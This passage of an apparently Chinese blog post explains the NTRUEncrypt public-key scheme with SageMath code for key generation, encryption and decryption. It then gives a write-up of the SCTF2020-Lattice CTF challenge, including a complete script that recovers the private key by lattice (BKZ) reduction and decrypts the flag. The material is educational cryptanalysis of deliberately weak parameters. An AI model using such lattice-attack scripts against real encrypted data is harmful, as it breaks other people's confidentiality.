+ 19*x^7 + 778*x^6 + 923*x^5 - 197*x^4 - 446*x^3 - 202*x^2 - 353*x - 852\n```\n\n显然函数和上面的基本一样，只是名称相应地缩短了一下。\n攻击方法是构造如下的一个格，然后进行规约\n$$\n\\left(\n\\begin{array}{cccc|cccc}\n\\lambda & 0 & \\cdots & 0 & h_0 & h_1 & \\cdots & h_{N-1} \\\\\\\\\n0 & \\lambda & \\cdots & 0 & h_{N-1} & h_0 & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots & \\vdots & \\vdots & \\ddots & 0 \\\\\\\\\n0 & 0 & \\cdots & \\lambda & h_1 & h_2 & \\cdots & h_0 \\\\\\\\ \\hline\n0 & 0 & \\cdots & 0 & q & 0 & \\cdots & 0 \\\\\\\\\n0 & 0 & \\cdots & 0 & 0 & q & \\cdots & 0 \\\\\\\\\n\\vdots & \\vdots & \\ddots & \\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\\\\\\n0 & 0 & \\cdots & 0 & 0 & 0 & \\cdots & q\n\\end{array}\n\\right)\n$$\n具体可以参考这篇 Paper: <https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.578.5423&rep=rep1&type=pdf>\n取 $\\lambda=1$ ，规约后最短向量即为 $[f\\enspace g]$ ，然后就可以计算私钥解密了。\nexp 如下：\n\n```python\nfrom Crypto.Util.number import *\nimport time\nstart = time.time()\nZx.<x> = ZZ[]\nn = 109 \nq = 2048\np = 3\nDf = 9\nDg = 10\nDr = 11\nh=510*x^108 - 840*x^107 - 926*x^106 - 717*x^105 - 374*x^104 - 986*x^103 + 488*x^102 + 119*x^101 - 247*x^100 + 34*x^99 + 751*x^98 - 44*x^97 - 257*x^96 - 749*x^95 + 648*x^94 - 280*x^93 - 585*x^92 - 347*x^91 + 357*x^90 - 451*x^89 - 15*x^88 + 638*x^87 - 624*x^86 - 458*x^85 + 216*x^84 + 36*x^83 - 199*x^82 - 655*x^81 + 258*x^80 + 845*x^79 + 490*x^78 - 272*x^77 + 279*x^76 + 101*x^75 - 580*x^74 - 461*x^73 - 614*x^72 - 171*x^71 - 1012*x^70 + 71*x^69 - 579*x^68 + 290*x^67 + 597*x^66 + 841*x^65 + 35*x^64 - 545*x^63 + 575*x^62 - 665*x^61 + 304*x^60 - 900*x^59 + 428*x^58 - 992*x^57 - 241*x^56 + 953*x^55 - 784*x^54 - 730*x^53 - 317*x^52 + 108*x^51 + 180*x^50 - 881*x^49 - 943*x^48 + 413*x^47 - 898*x^46 + 453*x^45 - 407*x^44 + 153*x^43 - 932*x^42 + 262*x^41 + 874*x^40 - 7*x^39 - 364*x^38 + 98*x^37 - 130*x^36 + 942*x^35 - 845*x^34 - 890*x^33 + 558*x^32 - 791*x^31 - 654*x^30 - 733*x^29 - 171*x^28 - 182*x^27 + 644*x^26 - 18*x^25 + 776*x^24 + 845*x^23 - 675*x^22 - 741*x^21 - 352*x^20 - 143*x^19 - 351*x^18 - 158*x^17 + 671*x^16 + 609*x^15 - 34*x^14 + 811*x^13 - 674*x^12 + 595*x^11 - 1005*x^10 + 855*x^9 + 831*x^8 + 768*x^7 + 133*x^6 - 436*x^5 + 1016*x^4 + 403*x^3 + 904*x^2 + 874*x + 248\ne=-453*x^108 - 304*x^107 - 380*x^106 - 7*x^105 - 657*x^104 - 988*x^103 + 219*x^102 - 167*x^101 - 473*x^100 + 63*x^99 - 60*x^98 + 1014*x^97 - 874*x^96 - 846*x^95 + 604*x^94 - 649*x^93 + 18*x^92 - 458*x^91 + 689*x^90 + 80*x^89 - 439*x^88 + 968*x^87 - 834*x^86 - 967*x^85 - 784*x^84 + 496*x^83 - 883*x^82 + 971*x^81 - 242*x^80 + 956*x^79 - 832*x^78 - 587*x^77 + 525*x^76 + 87*x^75 + 464*x^74 + 661*x^73 - 36*x^72 - 14*x^71 + 940*x^70 - 16*x^69 - 277*x^68 + 899*x^67 - 390*x^66 + 441*x^65 + 246*x^64 + 267*x^63 - 395*x^62 + 185*x^61 + 221*x^60 + 466*x^59 + 249*x^58 + 813*x^57 + 116*x^56 - 100*x^55 + 109*x^54 + 579*x^53 + 151*x^52 + 194*x^51 + 364*x^50 - 413*x^49 + 614*x^48 + 367*x^47 + 758*x^46 + 460*x^45 + 162*x^44 + 837*x^43 + 903*x^42 + 896*x^41 - 747*x^40 + 410*x^39 - 928*x^38 - 230*x^37 + 465*x^36 - 496*x^35 - 568*x^34 + 30*x^33 - 158*x^32 + 687*x^31 - 284*x^30 + 794*x^29 - 606*x^28 + 705*x^27 - 37*x^26 + 926*x^25 - 602*x^24 - 442*x^23 - 523*x^22 - 260*x^21 + 530*x^20 - 796*x^19 + 443*x^18 + 902*x^17 - 210*x^16 + 926*x^15 + 785*x^14 + 440*x^13 - 572*x^12 - 268*x^11 - 217*x^10 + 26*x^9 + 866*x^8 + 19*x^7 + 778*x^6 + 923*x^5 - 197*x^4 - 446*x^3 - 202*x^2 - 353*x - 852\n\n\ndef mul(f,g):\n    return (f * g) % (x^n-1)\ndef decrypt(pri_key,e):\n    f,fp = pri_key\n    a = bal_mod(mul(f,e),q)\n    b = bal_mod(mul(a,fp),p)\n    pt = ''.join([str(i) for i in b.list()])\n    return pt\ndef bal_mod(f,q):\n    g = list(((f[i] + q//2) % q) - q//2 for i in range(n))\n    return Zx(g)\ndef lattice(h,q):\n    n = 109\n    # h = bal_mod(683*h,q)\n    grid = Matrix(ZZ,2*n,2*n)\n    cof = h.list()\n    offset = 0\n    for i in range(2*n):\n        for j in range(2*n):\n            if i<n:\n                if j < n:\n                    if i==j:\n                        grid[i,j] = 1\n                else:\n                    grid[i,j] = cof[(j-n-offset)%n]\n            elif j>=n and i==j:\n                grid[i,j] = q\n        offset += 1\n    GL = grid.BKZ()\n    return GL,grid\n\ndef inv_mod_prime(f,p):\n    T = Zx.change_ring(Integers(p)).quotient(x^n-1)\n    return Zx(lift(1 / T(f)))\n\nGL,grid = lattice(h,q)\nSVP = list(GL[0])\nf = Zx(SVP[:n])\ng = Zx(SVP[-n:])\na = bal_mod(mul(f,e),q)\nfp = inv_mod_prime(f,p)\npv = (f,fp)\nprint(decrypt(pv,e))\nflag = int(decrypt(pv,e)+'0'*6,2)\nprint(flag)\nprint(long_to_bytes(flag))\n\nend = time.time()\nprint(end-start)\n```\n\n********************************\n\n## 勘误\n\n维基百科中说 $m$ 转化成系数在 $[-p/2,p/2]$ 间多项式，实际应为 $\\{-1,0,1\\}$ 间。\n代码中加密函数原为`return balancedmod(convolution(public_key,p*r) + message,q)`，一般版本中的公钥是没乘 $p$ 的，在加密中才乘，但这里公钥已经乘过 $p$ 了，就可以删去。实测不删去也可正常解密，推测应该是在后面取模时消去了，读者可自行推导。\n\n## 参考\n\n<https://en.wikipedia.org/wiki/NTRUEncrypt>\n<https://github.com/joannawetesko/NTRU-cryptosystem/blob/master/NTRU.sage>\n<https://blog.csdn.net/sinat_36742186/article/details/83689529>\n","slug":"NTRUEncrypt","published":1,"updated":"2024-06-05T07:53:16.105Z","_id":"cl8wgppp6000rck6g9az2a35s","comments":1,"layout":"post","photos":[],"content":"<p>NTRUEncrypt 公钥加密系统</p>\n<span id=\"more\"></span>\n<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>这里基本摘自维基百科，少少枯燥，可以自行选择略读。</p>\n<p>NTRUEncrypt 是一个公钥加密系统，它的安全性基于这样一个问题的困难性：在一个截断多项式环（这个翻译怪怪的）中<strong>将一个给定的多项式分解成两个系数非常小的多项式的商</strong>。<br>由于加密与解密都只涉及简单的多项式乘法，故相比于其他的加密系统， NTRUEncrypt 的<strong>效率会更高</strong>。<br>具体来说， NTRU 的操作基于截断多项式环中的对象 ${\\displaystyle \\ R=\\mathbb {Z} [X]/(X^{N}-1)}$ 中的<strong>卷积乘法</strong>，并且环上的所有多项式的系数和次数都为不大于 $N-1$ 的整数。<br>实际上， NTRU 是一个参数化系统，每个系统由三个整数指定 $(N,p,q)$ ，其中 $N$ 代表截断环上的所有多项式的最高次为 $N-1$ ， $p$ 和 $q$ 分别代表一个小模数和一个大模数。其中 $N$ 为素数， $q$ 大于 $p$ ，且 $p$ 与 $q$ 互质。由这三个参数生成四个多项式 $\\mathcal {L}_f,\\mathcal {L}_g,\\mathcal {L}_m \\thinspace$ 和 $\\mathcal {L}_r$ ，分别为私钥、公钥、消息和干扰数。</p>\n<hr>\n<p>看到这里，我相信懂的人都懂的，不懂的人还不懂（bushi）<br>下面从宏观和微观两方面详细解释</p>\n<h2 id=\"公钥生成\"><a href=\"#公钥生成\" class=\"headerlink\" title=\"公钥生成\"></a>公钥生成</h2><p>又双叒叕来到了密码学的老 CP —— Alice 和 Bob<br><img src=\"https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fauthorize.zhongbi.net%2Fd%2Ffile%2Ftu%2F2018%2F12%2F27%2F0wlyvynx1dv.jpg&refer=http%3A%2F%2Fauthorize.zhongbi.net&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1652234696&t=c5802c1784650149a8a25e0440448985\" alt=\"Alice&amp;Bob\"></p>\n<ol>\n<li>Bob 根据选定的 $N,p,q$ 生成最高次为 $N-1$ 的 $f$ 和 $g$ <strong>两个多项式</strong>，并且系数在 ${-1,0,1}$ 中选取（可以认为这俩是在模 $X^{N}-1$ 的剩余类中）。 $f$ 还要满足<strong>模 $q$ 和 $p$ 的逆元存在</strong>，如果不满足，那就重新生成。</li>\n<li>分别计算 $f$ 模 $p$ 和模 $q$ 的逆元，即 $f_{p}$ 和 $f_{q}$ ，<strong>保留 $f$ , $f_{p}$ 及 $g$ 作为私钥，公钥 $h=pf_{q} \\cdot g\\ \\pmod{q} $ 。</strong></li>\n</ol>\n<p>sagemath 代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_keys</span>():</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 基于提供的参数生成一个公私钥对</span></span><br><span class=\"line\"><span class=\"string\">        返回 f (私钥)和 F_p (公钥)&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 校验</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> validate_params():</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                <span class=\"comment\"># 生成两个随机多项式 f 和 g ，并且非零系数小于给定的 d</span></span><br><span class=\"line\">                f = generate_polynomial(d)</span><br><span class=\"line\">                g = generate_polynomial(d)</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\"># 假定 q 是 2 的幂，求得 f 模 q 的逆元             </span></span><br><span class=\"line\">                f_q = invertmodpowerof2(f,q)</span><br><span class=\"line\">                <span class=\"comment\"># 同样假定 p 是素数，求得 f 模 p 的逆元</span></span><br><span class=\"line\">                f_p = invertmodprime(f,p)  </span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">        </span><br><span class=\"line\">            <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                <span class=\"comment\"># 上面如果抛出异常，即逆元不存在，则重新生成</span></span><br><span class=\"line\">                <span class=\"keyword\">pass</span> </span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"comment\"># 公钥 h=pf_p*g (mod q)</span></span><br><span class=\"line\">        public_key = balancedmod(p * convolution(f_q,g),q)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># 保留 f 和 f_p 作为私钥</span></span><br><span class=\"line\">        secret_key = f,f_p</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> public_key,secret_key</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;Provided params are not correct. q and p should be co-prime, q should be a power of 2 considerably larger than p and p should be prime.&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"加密\"><a href=\"#加密\" class=\"headerlink\" title=\"加密\"></a>加密</h2><p>Alice 将消息 $m$ 转化成一个系数在 ${-1,0,1}$ 之间的多项式（比如转成二进制或三进制，二进制在这里会有些浪费），再随机生成一个系数较小（但不限于 ${-1,0,1}$ 中）的多项式 $r$ 作为干扰以掩盖消息。那么加密计算如下：<br>$$<br>    e=r \\cdot h+m \\pmod{q}<br>$$<br>举个栗子：<br>当取 $N=5,p=3,q=32$ 时（呃这里待更新）<br>$$<br>    f=-1+X+X^2<br>$$</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">generate_message</span>():</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 随机生成一个系数在&#123;-1,0,1&#125;中的多项式&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    result = <span class=\"built_in\">list</span>(randrange(<span class=\"number\">3</span>) - <span class=\"number\">1</span> <span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(N))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(result)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encrypt</span>(<span class=\"params\">message, public_key</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 基于提供的公钥加密消息&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 生成一个随机多项式，并且非零系数小于给定的d，作为干扰以掩盖消息   </span></span><br><span class=\"line\">    r = generate_polynomial(d)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 加密：e = r * h + m (mod q)</span></span><br><span class=\"line\">    <span class=\"comment\"># while performing modulo operation, balance coefficients of encrypted_message </span></span><br><span class=\"line\">    <span class=\"comment\"># for the integers in interval [-q/2, +q/2]</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> balancedmod(convolution(public_key,r) + message,q)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"解密\"><a href=\"#解密\" class=\"headerlink\" title=\"解密\"></a>解密</h2><p>由于其他人不知道 $r$ ，所以无法直接 $m=e-rh$ ，但 Bob 拿到 $e$ 后，可以计算出<br>$$<br>\\begin{equation*}<br>\\begin{split}<br>    a<br>    &amp; = f \\cdot e \\pmod{q}\\\\<br>    &amp; = f \\cdot (r \\cdot h+m) \\pmod{q}\\\\<br>    &amp; = f \\cdot (r \\cdot pf_{q} \\cdot g+m) \\pmod{q}\\\\<br>    &amp; = pr \\cdot g + f \\cdot m \\pmod{q}<br>\\end{split}<br>\\end{equation*}<br>$$<br>关键部分来了，以上都是在模 $q$ 下进行，而这时忽然就变成了模 $p$<br>$$<br>b=a=f \\cdot m \\pmod{p} \\\\<br>c=f_{p} \\cdot b =f_{p} \\cdot f \\cdot m =m \\pmod{p}<br>$$</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt</span>(<span class=\"params\">encrypted_message, secret_key</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 基于提供的私钥解密密文&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># 拿到私钥的两个多项式  </span></span><br><span class=\"line\">    f,f_p = secret_key</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># a = f * e (mod p)</span></span><br><span class=\"line\">    a = balancedmod(convolution(encrypted_message,f),q)</span><br><span class=\"line\">     </span><br><span class=\"line\">    <span class=\"comment\"># c = f_p * a (mod p)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> balancedmod(convolution(a,f_p),p)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"函数实现\"><a href=\"#函数实现\" class=\"headerlink\" title=\"函数实现\"></a>函数实现</h2><p>下面从微观上解释一下上面函数的实现：</p>\n<h3 id=\"卷积\"><a href=\"#卷积\" class=\"headerlink\" title=\"卷积\"></a>卷积</h3><p>多项式卷积满足公式<br>$$<br>    a(x)*b(x) = c(x) \\ with \\ c_k = \\sum_{i+j=k \\pmod} a_i b_{k-i \\pmod{N}}<br>$$<br>举个栗子：<br>$$<br>    f(x)=-1+4x+x^2 \\\\<br>    g(x)=3-x+5x^2<br>$$<br>注意此时多项式和级数类似，采用低次项在先的书写方式<br>则<br>$$<br>    f(x)*g(x) = c(x) \\pmod{3}<br>$$<br>其中<br>$$<br>c_0 = \\sum_{i+j=0 \\pmod{N}} f_i g_{0-i} = f_0g_0 + f_1g_2 + f_2g_1 = -1 \\times 3 + 4 \\times 5 + 1 \\times (-1) = -3 + 20 + (-1) = 16 \\\\<br>c_1 = f_0g_1 + f_1g_0 + f_2g_2 = -1 \\times (-1) + 4 \\times 3 + 1 \\times 5 = 1 + 12 + 5 = 18 \\\\<br>c_2 = f_0g_2 + f_1g_1 + f_2g_0 = -1 \\times 5 + 4 \\times (-1) + 1 \\times 3 = -5 + (-4) + 3 = -6<br>$$<br>故<br>$$<br>c(x) = 16 + 18x - 6x^2<br>$$<br>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">convolution</span>(<span class=\"params\">f,g</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 多项式卷积运算&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> (f * g) % (x^N-<span class=\"number\">1</span>)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"取模\"><a href=\"#取模\" class=\"headerlink\" title=\"取模\"></a>取模</h3><p>这里将多项式的每个系数 $f_i$ 拿出来，然后作变换 $g_i=(f_i+q/2)%q-q/2$ 再塞回去。这样每个系数都在 $[-q/2,q/2]$ 之间，这样可以保证模 $q$ 的运算。<br>比如取 $q=3$ 时，有以下映射关系：<br>$$<br>-3 \\rightarrow (-3+1)%3 -1 = 0 \\\\<br>-2 \\rightarrow (-2+1)%3 -1 = 1 \\\\<br>-1 \\rightarrow (-1+1)%3 -1 = -1 \\\\<br>0 \\rightarrow (0+1)%3-1 = 0 \\\\<br>1 \\rightarrow (1+1)%3-1 = 1 \\\\<br>2 \\rightarrow (2+1)%3-1 = -1 \\\\<br>3 \\rightarrow (3+1)%3-1 = 0<br>$$<br>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">balancedmod</span>(<span class=\"params\">f,q</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 多项式取模&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    g = <span class=\"built_in\">list</span>(((f[i] + q//<span class=\"number\">2</span>) % q) - q//<span class=\"number\">2</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(N))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(g)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"求逆元\"><a href=\"#求逆元\" class=\"headerlink\" title=\"求逆元\"></a>求逆元</h3><p>这也是我比较疑惑的一部分，一直不知道多项式的逆元具体怎么求，现在也看开了，随便怎么样吧，反正不是我手写（）<br>这里先变基到 $X^N-1$ 商环然后求逆元再 lift 到整环上，关于原理我至今有点异或，有缘回来补坑吧。<br>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">invertmodprime</span>(<span class=\"params\">f,p</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 假定 p 为素数,计算一个多项式模 x^N-1 下的逆元再模 p</span></span><br><span class=\"line\"><span class=\"string\">        返回一个 Zx 上的多项式 h 满足 h 与 f 卷积模 p 为 1</span></span><br><span class=\"line\"><span class=\"string\">        不存在逆元时会抛出异常&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    T = Zx.change_ring(Integers(p)).quotient(x^N-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(lift(<span class=\"number\">1</span> / T(f)))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">invertmodpowerof2</span>(<span class=\"params\">f,q</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27; 假定 q 为 2 的幂，计算一个多项式模 x^N-1 下的逆元再模 q</span></span><br><span class=\"line\"><span class=\"string\">        返回一个 Zx 上的多项式 h 满足 h 与 f 卷积模 q 为 1</span></span><br><span class=\"line\"><span class=\"string\">        不存在逆元时会抛出异常&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> q.is_power_of(<span class=\"number\">2</span>)     <span class=\"comment\"># 断言 q 是 2 的幂</span></span><br><span class=\"line\">    h = invertmodprime(f,<span class=\"number\">2</span>)     <span class=\"comment\"># 首先求 f 模 2 的逆元</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        r = balancedmod(convolution(h,f),q)         <span class=\"comment\"># 计算 r = h * f (mod q)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> r == <span class=\"number\">1</span>: <span class=\"keyword\">return</span> h                         <span class=\"comment\"># 若 h * f = 1 (mod q)，则返回 h 即为所求逆元</span></span><br><span class=\"line\">        h = balancedmod(convolution(h,<span class=\"number\">2</span> - r),q)     <span class=\"comment\"># 否则，h = h * (2 - r) (mod q)</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h2><p>格约化攻击是一种非常著名的针对 NTRUEncrypt 的攻击，类似于 RSA 分解质因数。<br>当选取的 $N$ 较小时，可以构造维度较低的格分解公钥 $h$ 。</p>\n<h3 id=\"例题-SCTF2020-Lattice\"><a href=\"#例题-SCTF2020-Lattice\" class=\"headerlink\" title=\"例题 SCTF2020-Lattice\"></a>例题 SCTF2020-Lattice</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> base64 <span class=\"keyword\">import</span> b16encode</span><br><span class=\"line\"></span><br><span class=\"line\">Zx.&lt;x&gt; = ZZ[]</span><br><span class=\"line\">n = <span class=\"number\">109</span> </span><br><span class=\"line\">q = <span class=\"number\">2048</span></span><br><span class=\"line\">p = <span class=\"number\">3</span></span><br><span class=\"line\">Df = <span class=\"number\">9</span></span><br><span class=\"line\">Dg = <span class=\"number\">10</span></span><br><span class=\"line\">Dr = <span class=\"number\">11</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mul</span>(<span class=\"params\">f,g</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (f * g) % (x^n-<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">bal_mod</span>(<span class=\"params\">f,q</span>):</span><br><span class=\"line\">    g = <span class=\"built_in\">list</span>(((f[i] + q//<span class=\"number\">2</span>) % q) - q//<span class=\"number\">2</span> <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(g)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">random_poly</span>(<span class=\"params\">d</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> d &lt;= n</span><br><span class=\"line\">    result = n*[<span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(d):</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            r = randrange(n)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> result[r]: <span class=\"keyword\">break</span></span><br><span class=\"line\">        result[r] = <span class=\"number\">1</span>-<span class=\"number\">2</span>*randrange(<span class=\"number\">2</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(result)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">inv_mod_prime</span>(<span class=\"params\">f,p</span>):</span><br><span class=\"line\">    T = Zx.change_ring(Integers(p)).quotient(x^n-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Zx(lift(<span class=\"number\">1</span> / 